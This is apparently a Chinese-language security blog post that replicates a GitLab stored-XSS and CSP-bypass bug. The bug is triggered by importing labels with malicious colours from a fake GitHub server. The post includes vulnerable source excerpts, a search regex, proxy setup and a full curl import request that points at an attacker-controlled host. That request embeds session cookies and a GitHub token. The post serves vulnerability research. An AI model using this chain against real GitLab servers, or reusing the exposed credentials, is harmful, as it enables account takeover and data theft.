---
layout: post
title:  "Replication: Gitlab Stored-XSS with CSP-bypass via labels' color"
date:  2023-11-15 10:31:06 +0800
categories: xss
---

## Name

> Stored-XSS with CSP-bypass via labels' color

## Weakness

> XSS

## Severity

> 高危

## Environment

> gitlab版本：14.5.2-ee

> 原文：[https://hackerone.com/reports/1665658](https://hackerone.com/reports/1665658)

## URL



## Summary

  gitlab导入外部github仓库数据，并且未对数据进行过滤，导致后端渲染时xss。伪造github服务器，返回xss payload，后端渲染的时候没有对引号进行处理，导致新的标签/属性可以插入。如下，`bg_color`字段没有进行过滤。这是后端渲染的问题，xss在后端模板被注入

  ```
  def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
    <<~HTML.chomp.html_safe
      <span
        class="#{css_class}"
        data-container="body"
        data-html="true"
        #{"style=\"background-color: #{bg_color}\"" if bg_color}
      >#{ERB::Util.html_escape_once(name)}#{suffix}</span>
    HTML
  end
  ```

#### Code Review

##### 基于函数流分析

1. 首先定位到漏洞代码：
    *gitlab/app/helpers/labels_helper.rb#266*
    ```
    def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
      <<~HTML.chomp.html_safe
        <span
          class="#{css_class}"
          data-container="body"
          data-html="true"
          #{"style=\"background-color: #{bg_color}\"" if bg_color}
        >#{ERB::Util.html_escape_once(name)}#{suffix}</span>
      HTML
    end
    ```
2. 然后定位到该文件中调用该函数的两个函数，分别是link_to_label和render_label，他们的第一个参数label包含了漏洞数据：
    *gitlab/app/helpers/labels_helper.rb#39*
    ```
    def link_to_label(label, type: :issue, tooltip: true, small: false, css_class: nil, &block)
      render_label(label, link: link, tooltip: tooltip, small: small)
  
    end
    def render_label(label, link: nil, tooltip: true, dataset: nil, small: false)
      html = render_colored_label(label)
    end
    ```
3. 首先分析render_label函数，引用该函数进行数据渲染的地方都是模板文件，一共有三处，这三处都是shared view：
  
    *gitlab/app/views/shared/_label_row.html.haml*
    *gitlab/app/views/shared/milestones/_issuable.html.haml*
    *gitlab/app/views/shared/milestones/_labels_tab.html.haml*
  
4. 先分析第一处，旁边的_label.html.haml引用该模板，则搜索`shared/label`关键字
    *gitlab/app/views/shared/_label.html.haml#10*
    ```
    %li.label-list-item{ id: label_css_id, data: { id: label.id } }
        = render "shared/label_row", label: label, force_priority: force_priority
        %ul.label-actions-list
    ```
5. 找到一处引用该模板的文件，那么projects labels就是路由了，进去可以看到渲染结果：
    *gitlab/app/views/projects/labels/index.html.haml*

    ![labels](labels.png)

    渲染的bg_color:

    ![bg_color](bg_color.png)

6. 但是新建label时，后端对label的color做了valid校验，填入非color会报错无法插入数据库。因此攻击者想到bulk_insert，该方法可以绕过校验直接插入数据库。刚好github_import提供label的bulk_insert功能。怎么会想到该功能呢？并且刚好有label模型使用该方法插入数据呢？难道这就是碰运气吗？还是说对项目的全面理解。假设我们已经找到label存在bulk_insert，其位置在类LabelsImporter中。复现完后，我想可能是攻击者首先对api进行检查，当看到import接口可以设置自定义的域名后，就开始从头分析，而非逆向分析。因为这种导入接口大概率存在漏洞。正向分析的过程中，检查这个接口都导入了什么资源，而且检查这些资源的渲染方式，从而定位到了漏洞。
    *gitlab/lib/gitlab/github_import/importer/labels_importer.rb#16*
    ```
    def execute
      bulk_insert(Label, build_labels)
      build_labels_cache
    end
    ```
7. 注意到该攻击还绕过了csp，绕过csp的方式是`jquery+<script>tag`，只有在渲染`<script>`标签可以绕过，其他的例如onerror不行，经过测试利用该漏洞能够绕过script-src self csp，简直无敌。
    *gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#507*
    ```
    renderRow(item) {
        let criteria = {};
        let groupRowEl;
        switch (item.type) {
          case LEVEL_TYPES.DEPLOY_KEY:
            groupRowEl =
              this.accessLevel === ACCESS_LEVELS.PUSH ? this.deployKeyRowHtml(item, isActive) : '';
            break;
        }
        return groupRowEl;
      }
    ```
8. csp:
    
    **Self**: 仅仅执行同域名的js文件，所有event handler和`<script></script>`内的代码都不执行。`Jquery+<script>`标签可绕过
    **Unsafe-inline**: 所有event handler和`<script></script>`内的代码可以执行，但是出现either a hash or nonce value，该条失效，就是说若存在'nonce-xxx'，那么unsafe-inline无效，event handler和`<script>`内部代码都不执行。`Jquery+<script>`标签可绕过
    
9. 其中csp绕过的jquery代码如下：
    *app/assets/javascripts/gl_field_error.js#66*
    ```
    constructor({ input, formErrors }) {
      this.inputElement = $(input);
      this.inputDomElement = this.inputElement.get(0);
      this.form = formErrors;
      this.errorMessage = this.inputElement.attr('title') || __('This field is required.');
      this.fieldErrorElement = $(`<p class='${errorMessageClass} hidden'>${this.errorMessage}</p>`);
      this.state = {
        valid: false,
        empty: true,
        submitted: false,
      };
      this.initFieldValidation();
    }
    ```
    可以看到`${this.errorMessage}`没有过滤直接嵌入jquery元素中，该处也可以形成一个regex，该代码在整个gitlab源码中只匹配到了上面片段：
    ```
    \$\([`\x27"][\s\S]{0,100}?<[\s\S]{3,200}?>[\s\S]{0,100}?[`\x27"]\)
    ```
    注意在linux command中，`'`需要escape，方法是\x27代替单引号，\x22代替双引号，下面的双引号其实不需要escape，例如，参考：[https://stackoverflow.com/a/65878993](https://stackoverflow.com/a/65878993)
    ```
    python ~/zero/DirBrute/findRegexInDir.py -d ~/discourse -f "\.js$" -r '\$\([`\x27\x22"]<[\s\S]{3,200}?>[`\x27\x22]\)' -n 'node_modules|test.js|spec.js'
    ```
10. 下面是负责导入github的后端api类，找到github client，搜索GithubImport::Client.new来定位该类实例化的位置，可以找到两个位置，分别是：
    *app/controllers/import/github_controller.rb*
    *lib/api/import_github.rb*

    ![import_github](import_github.png)

    其中github_controller中，host无法被修改，因此默认为github的api：
    *app/controllers/import/github_controller.rb#108*
    ```
    def client
        @client ||= if Feature.enabled?(:remove_legacy_github_client)
                    Gitlab::GithubImport::Client.new(session[access_token_key])
                else
                    Gitlab::LegacyGithubImport::Client.new(session[access_token_key], **client_options)
                end
    end
    ```
    而import_github.rb中host可以修改，因此可以控制:
    *lib/api/import_github.rb#14*
    ```
    def client
        @client ||= if Feature.enabled?(:remove_legacy_github_client)
                    Gitlab::GithubImport::Client.new(params[:personal_access_token], host: params[:github_hostname])
                else
                    Gitlab::LegacyGithubImport::Client.new(params[:personal_access_token], client_options)
                end
    end
    ```
    注意到，只能通过github来导入，如果选择用git或者其他方式导入，那么不会导入labels。

11. 经过分析import_github.rb是grape构建的api接口，可以通过/v4/api访问调用，参考：
    [https://github.com/ruby-grape/grape](https://github.com/ruby-grape/grape)
    
    *lib/api/api.rb*
    *config/routes/api.rb*
    *config/routes.rb#273* 
    最终被mount挂载到主路由文件中

12. 导入测试，需要伪造一个假github服务器。首先通过导入正常的github仓库，并且对gitlab后端进行抓包，从而查看gitlab如何与github交互。

13. 首先在gitlab所在的Ubuntu服务器上安装burpsuite证书，参考[该链接](https://ubuntu.com/server/docs/security-trust-store)，安装burpsuite证书到系统ca根目录。然后设置终端http_proxy和https_proxy系统变量为windows host的burpsuite端口。启动gitlab服务后，rails自动使用该代理。设置后，从github导入项目时，后端发送的请求就能够通过burp拦截。
    ```
    export https_proxy=http://10.15.0.147:8085
    export http_proxy=http://10.15.0.147:8085
    ```

    ![import1](import1.png)

    ![import2](import2.png)
    
12. 伪造fake github server，需要一个公网服务器，并且在该服务器上安装gitea以便gitlab能导入仓库数据。node server代码如下：

    [github fake server](vscode-local:/c%3A/Users/11593/AppData/Local/Temp/OneNote/16.0/Exported/%7B2E4B8080-29FE-40E1-B921-B593FF5E3AE4%7D/NNT/0/rb.zip)

    **gitea配置**

    伪造的服务器需要配置gitea服务，并且需要和伪造请求中的git地址一样，这样gitlab会从伪造的服务器拉取代码和后续labels请求，否则还是会去github拉取。gitea默认开启在3000端口，但是可通过nginx proxy代理到80端口，这一步是必要的。

13. fake github server配置完成后，直接调用gitlab提供的api进行导入操作：

    ```
    curl --location 'http://127.0.0.1:3000/api/v4/import/github' \
    --header 'Accept: application/json, text/plain, */*' \
    --header 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5' \
    --header 'Cache-Control: no-cache' \
    --header 'Connection: keep-alive' \
    --header 'Cookie: perf_bar_enabled=true; preferred_language=en; hide_auto_devops_implicitly_enabled_banner_8=false; visitor_id=ae1ea916-faeb-458b-a6fe-e823e28e4946; frequently_used_emojis=smile%2Csmiley%2Cblush%2Cflag_wf%2Cman_dancing_tone3%2Cman_dancing_tone1; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqTmlOVE0zWkRnMExXWm1ZV0V0TkRrd1pTMDVORGswTFRJell6VTVaalJqWmpjek15ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--e03f99e2fe31888f17b1a38192c53e1a7c6eebe7; sidebar_collapsed=false; BetterErrors-2.9.1-CSRF-Token=7ebd9970-0ce3-4b4f-b4d6-0a96114c3c57; known_sign_in=cC9DbkxsUmZZVG1EeGZ3bGhlQmVXQlVqWnVKQ2k1aklucEc1QmpXTjQrUTBYQ2M1c2l4K0J4czRxclRVekNmZmFSeVRKaGduYzJ4eEQxa2ZRUmhzWEdZeXV0VTdyd21pMnlkd3ltdExOYWlEeHVDUlNwMjdvTEVKQWNvaFZGdFotLS9TNTRJc3gwWEdtRTYxamFOWmhUU3c9PQ%3D%3D--33ef27c41f5b2d1b3b3f81b201525cb25ad31280; hide_auto_devops_implicitly_enabled_banner_6=false; event_filter=push; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hYU3dpSkRKaEpERXdKRWR6TjNCbWJIaERiM2hYYW1WelpFcEVMakppTnk0aUxDSXhOekF3TmpFMk56VXdMakU0TURVeE5ETWlYUT09IiwiZXhwIjoiMjAyMy0xMi0wNlQwMTozMjozMC4xODBaIiwicHVyIjoiY29va2llLnJlbWVtYmVyX3VzZXJfdG9rZW4ifX0%3D--d9f8a3d3facd1ae216b64bae4390ee38fd8cd5e2; _gitlab_session_07baa7241726843883bf7ec3444d875952c2c2a722793cb27890cede722617b2=bbe97137c1f77a28d631400fc209d6b4; _gitlab_session_07baa7241726843883bf7ec3444d875952c2c2a722793cb27890cede722617b2=42172205f2e8b1d7619454840d139af6' \
    --header 'Pragma: no-cache' \
    --header 'Referer: http://127.0.0.1:3000/root/final5' \
    --header 'Sec-Fetch-Dest: empty' \
    --header 'Sec-Fetch-Mode: cors' \
    --header 'Sec-Fetch-Site: same-origin' \
    --header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' \
    --header 'X-CSRF-Token: gmIiPkGG+9ZjV7zsBfslb4QjfYZSFDSszxzQy2/+RcfCFZtow6G8uogwP2lpmW4PIWuywI71kwZ5Ezvbw802/g==' \
    --header 'X-Requested-With: XMLHttpRequest' \
    --header 'sec-ch-ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"' \
    --header 'sec-ch-ua-mobile: ?0' \
    --header 'sec-ch-ua-platform: "Windows"' \
    --header 'Content-Type: application/json' \
    --data '{"repo_id":721517979,"personal_access_token":"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","new_name":"final7","target_namespace":"root","github_hostname":"http://8.134.66.236"}'
    ```

#### Tips
1. 该漏洞输入后端渲染漏洞，本来后端渲染数据是通过默认的haml模板用=进行渲染，这时会自动完成对数据的escape，但是这里的漏洞采用了函数调用返回html字符串的形式，并且字符串在函数中标注了`HTML.chomp.html_safe`。
    *app/views/shared/_label_row.html.haml*
    ```
    .label-name.gl-flex-shrink-0.gl-mt-2.gl-mr-3
      = render_label(label, tooltip: false)
    ```
    *gitlab/app/helpers/labels_helper.rb#266*
    ```
    def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
        <<~HTML.chomp.html_safe
            <span
            class="#{css_class}"
            data-container="body"
            data-html="true"
            #{"style=\"background-color: #{bg_color}\"" if bg_color}
            >#{ERB::Util.html_escape_once(name)}#{suffix}</span>
        HTML
    end
    ```
    果然后端是html_safe引发的问题。这样，变量中的xss代码就能够被嵌入了。
2. csp绕过利用了前端jquery的漏洞，主要gitlab前端会扫描后端返回的html并且对某些标签进行jquery化的处理，很多漏洞都来源于这种机制。要绕过严格的csp不是简单的事情，但是jquery配合`<script></script>`html注入，就可能够绕过self这样严格的限制。简直是最大的bug，到2023年11月都没有修复。
